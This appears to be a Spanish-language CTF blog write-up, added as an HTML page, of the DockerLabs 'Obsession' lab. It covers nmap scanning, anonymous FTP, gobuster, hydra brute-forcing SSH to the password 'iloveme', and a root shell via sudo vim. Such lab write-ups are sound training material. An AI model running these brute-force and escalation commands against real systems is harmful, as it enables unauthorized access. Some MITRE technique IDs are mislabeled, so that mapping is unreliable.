@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina Obsession | ZsZsec</title>
+<meta content="Nivel : Muy Fácil Autor : Dockerlabs Categoría : FTP, Fuerza bruta, Escalada de privilegios sudo vim Escaneo inicial con Nmap El primer paso en cualquier auditoría es obtener visib..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">DockerLabs</p>
+<h1>Maquina Obsession<span>_</span></h1>
+<div class="writeup-meta"><span>Nmap / web / gobuster</span></div>
+<div class="tag-row"><span class="tag">Nmap</span><span class="tag">web</span><span class="tag">gobuster</span><span class="tag">ssh</span><span class="tag">SUID</span><span class="tag">vim</span><span class="tag">hydra</span><span class="tag">fuerza_bruta</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<p><strong>Nivel</strong>: Muy Fácil<br/>
+<strong>Autor</strong>: Dockerlabs<br/>
+<strong>Categoría</strong>: FTP, Fuerza bruta, Escalada de privilegios (sudo-vim)</p>
+<h2>Escaneo inicial con Nmap</h2>
+<p>El primer paso en cualquier auditoría es obtener visibilidad de los servicios expuestos en el objetivo.</p>
+<p>Usamos:</p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[~]
+└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 172.17.0.2 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-10 16:49 CDT
+Nmap scan report for 172.17.0.2
+Host is up (0.000011s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:172.17.0.1
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
+|_-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)
+|_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-title: Russoski Coaching
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds
+</code></pre>
+<p><strong>Explicación de flags</strong>:</p>
+<ul>
+<li><code>-sS</code>: escaneo SYN (rápido y sigiloso)</li>
+<li><code>-sV</code>: detección de versiones</li>
+<li><code>-sC</code>: scripts por defecto (equivale a un escaneo NSE básico)</li>
+<li><code>-Pn</code>: sin ping (útil si ICMP está bloqueado)</li>
+<li><code>-p-</code>: todos los puertos</li>
+<li><code>--min-rate 5000</code>: rapidez del escaneo</li>
+</ul>
+<p>Resultado:</p>
+<pre><code class="language-bash">21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.58
+</code></pre>
+<p>Esto nos da 3 vectores: <strong>FTP, SSH y web</strong>.</p>
+<h2>Enumeración del servicio FTP (puerto 21)</h2>
+<p>Probamos acceso anónimo:</p>
+<pre><code class="language-bash">ftp 172.17.0.2
+User: anonymous
+Pass: (vacío)
+</code></pre>
+<p>Acceso permitido (código FTP 230).</p>
+<pre><code class="language-bash">-rw-r--r-- 1 0 0 667 Jun 18 2024 chat-gonza.txt
+-rw-r--r-- 1 0 0 315 Jun 18 2024 pendientes.txt
+</code></pre>
+<p>Contenido tipo chat de WhatsApp entre dos personas (Russoski y Gonza):</p>
+<blockquote>
+<p>Se menciona un <strong>video subido a una ruta segura</strong>, pero no se proporciona la URL. Este detalle nos hace pensar que hay archivos o rutas ocultas en la web que aún no se han revelado.</p>
+</blockquote>
+<pre><code class="language-bash">                                                                  
+┌──(zikuta㉿zikuta)-[~]
+└─$ cat chat-gonza.txt
+[16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal Nágore como dices?
+[16:28, 16/6/2024] Russoski: es una auténtica princesa pff, le he hecho hasta un vídeo y todo, lo tengo ya subido y tengo la URL guardada
+[16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres
+[21:52, 16/6/2024] Gonza: buah la verdad tenías razón eh, es hermosa esa chica, del 9 no baja
+[21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, así sí
+[22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y sí buen training hoy
+</code></pre>
+<h3><code>pendientes.txt</code>:</h3>
+<pre><code class="language-bash">1. Comprar voucher de eJPT
+2. Aumentar precio de asesorías online en la Web
+3. Terminar laboratorio para Dockerlabs
+4. Cambiar algunas configuraciones inseguras del equipo
+</code></pre>
+<p>La última línea indica que el sistema <strong>podría tener permisos mal configurados o vulnerabilidades sin corregir.</strong></p>
+<h2>Enumeración Web (puerto 80)</h2>
+<p>Accedemos a <code>http://172.17.0.2/</code> y vemos una web personal de un entrenador llamado <strong>Russoski</strong>, quien ofrece asesorías.</p>
+<p>El diseño es estático, pero queremos saber si hay rutas ocultas. Entonces usamos <code>gobuster</code>:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~]
+└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt,php,html,py -t 40
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.17.0.2
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,php,html,py
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 5208]
+/.html                (Status: 403) [Size: 275]
+/backup               (Status: 301) [Size: 309] [--&gt; http://172.17.0.2/backup/]                                                           
+/important            (Status: 301) [Size: 312] [--&gt; http://172.17.0.2/important/]                                                        
+/.html                (Status: 403) [Size: 275]
+/server-status        (Status: 403) [Size: 275]
+</code></pre>
+<h3>Rutas interesantes descubiertas:</h3>
+<pre><code class="language-bash">/index.html           [200]
+/backup               [301]
+/important            [301]
+</code></pre>
+<h2>Inspección del contenido oculto</h2>
+<p><code>/backup/backup.txt</code>:</p>
+<pre><code class="language-bash">Usuario para todos mis servicios: russoski (cambiar pronto!)
+</code></pre>
+<p>Esto revela el <strong>nombre de usuario principal del sistema</strong>, y sugiere <strong>mala higiene de contraseñas</strong>, ya que no ha cambiado algo tan crítico.</p>
+<h3><code>/important/important.md</code>:</h3>
+<p>Un manifiesto tipo "Hacker's Manifesto". Es texto decorativo, <strong>sin información técnica directamente útil</strong>, pero <strong>refuerza el perfil del usuario como alguien egocéntrico y técnico</strong>, lo cual nos será útil después.</p>
+<h2>Ataque de fuerza bruta sobre SSH (puerto 22)</h2>
+<p>Con la información obtenida:</p>
+<ul>
+<li>Usuario: <code>russoski</code></li>
+<li>Estilo de escritura narcisista y emocional ("me grabé", "es hermosa", "yo tengo buen gusto")</li>
+<li>Contraseñas probablemente simples</li>
+</ul>
+<p><strong>Hipótesis lógica</strong>: si es egocéntrico, probablemente use algo como <code>iloveme</code>, <code>123456</code>, <code>password</code>, etc.</p>
+<pre><code>ATAQUE DE FUERZA BRUTA SOBRE SSH CON HYDRA:</code></pre>
+<pre><code class="language-bash">                                                                    
+┌──(zikuta㉿zikuta)-[~]
+└─$ hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2    
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-10 17:42:03
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 5 final worker threads did not complete until end.
+[ERROR] 5 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-10 17:42:49
+</code></pre>
+<p>Probamos:</p>
+<pre><code class="language-bash">ssh russoski@172.17.0.2
+Contraseña: iloveme
+</code></pre>
+<p>¡Acceso exitoso!</p>
+<h1>Escalada de privilegios (de usuario a root)</h1>
+<p>Realizamos un sudo -l</p>
+<pre><code class="language-bash">russoski@d97f456bcdcb:~$ sudo -l
+Matching Defaults entries for russoski on d97f456bcdcb:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User russoski may run the following commands on d97f456bcdcb:
+    (root) NOPASSWD: /usr/bin/vim
+
+</code></pre>
+<p><code>russoski</code> puede ejecutar <strong>vim como root sin contraseña</strong>.</p>
+<p>Esto es extremadamente peligroso, ya que vim permite ejecutar comandos de shell.</p>
+<h3>Escalada:</h3>
+<p>Ejecutamos el siguiente comando</p>
+<pre><code class="language-bash">russoski@d97f456bcdcb:~$ sudo /usr/bin/vim vim -c ':!/bin/sh'
+
+# whoami
+root
+</code></pre>
+<p>Se obtiene <strong>shell como root</strong> al instante.</p>
+<h1>Conclusion Final</h1>
+<table>
+<thead>
+<tr>
+<th>Paso</th>
+<th>Resultado clave</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Acceso anónimo a FTP</td>
+<td>Archivos con pistas clave: nombre de usuario, hints</td>
+</tr>
+<tr>
+<td>Enumeración web</td>
+<td>Archivos ocultos con info crítica (usuario)</td>
+</tr>
+<tr>
+<td>Brute force lógico</td>
+<td>Contraseña débil basada en el ego del usuario</td>
+</tr>
+<tr>
+<td>Escalada de privilegios</td>
+<td>Configuración peligrosa de <code>vim</code> en sudo sin contraseña</td>
+</tr>
+</tbody>
+</table>
+<h2>Lecciones aprendidas</h2>
+<ul>
+<li><strong>FTP anónimo</strong> sin control es una puerta abierta al sistema.</li>
+<li>Los <strong>detalles personales</strong> pueden ser clave para ataques de ingeniería social o bruteforce lógico.</li>
+<li>Permitir <code>vim</code> como sudo sin contraseña equivale a entregar acceso root.</li>
+<li>Nunca reutilices nombres de usuario/credenciales en todos tus servicios.</li>
+<li>El contenido "irrelevante" puede tener valor estratégico.</li>
+</ul>
+<h1>Mitre ATT&amp;CK</h1>
+<table>
+<thead>
+<tr>
+<th>🔷 Táctica (Objetivo del atacante)</th>
+<th>🧩 Técnica (Lo que hizo)</th>
+<th>🆔 ID MITRE</th>
+<th>💬 Descripción en contexto de la máquina Obsession</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Initial Access</strong></td>
+<td>Valid Accounts: SSH</td>
+<td>T1078.004</td>
+<td>Se usaron credenciales válidas (<code>russoski : iloveme</code>) para acceder por SSH.</td>
+</tr>
+<tr>
+<td><strong>Discovery</strong></td>
+<td>File and Directory Discovery</td>
+<td>T1083</td>
+<td>Se exploraron archivos dentro del FTP (<code>chat-gonza.txt</code>, <code>pendientes.txt</code>) y la web.</td>
+</tr>
+<tr>
+<td></td>
+<td>Active Scanning</td>
+<td>T1595.001</td>
+<td>Uso de <code>nmap</code> para detectar servicios y puertos abiertos del objetivo.</td>
+</tr>
+<tr>
+<td></td>
+<td>Gather Victim Org Info: Web Infrastructure</td>
+<td>T1592.004</td>
+<td>Se revisó la estructura del sitio (<code>/backup</code>, <code>/important</code>) y se obtuvo el nombre de user.</td>
+</tr>
+<tr>
+<td><strong>Credential Access</strong></td>
+<td>Brute Force: Password Guessing</td>
+<td>T1110.001</td>
+<td>Contraseña fue adivinada lógicamente (<code>iloveme</code>) para el usuario <code>russoski</code>.</td>
+</tr>
+<tr>
+<td><strong>Privilege Escalation</strong></td>
+<td>Abuse Elevation Control Mechanism: Sudo and Sudo Caching</td>
+<td>T1548.001</td>
+<td>El usuario podía ejecutar <code>vim</code> con sudo sin contraseña para escalar a root.</td>
+</tr>
+<tr>
+<td><strong>Execution / Defense Evasion</strong></td>
+<td>Command and Scripting Interpreter: vim Shell</td>
+<td>T1059.005</td>
+<td>Se usó <code>vim -c '!bash'</code> como intérprete de comandos para ejecutar comandos como root.</td>
+</tr>
+</tbody>
+</table>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
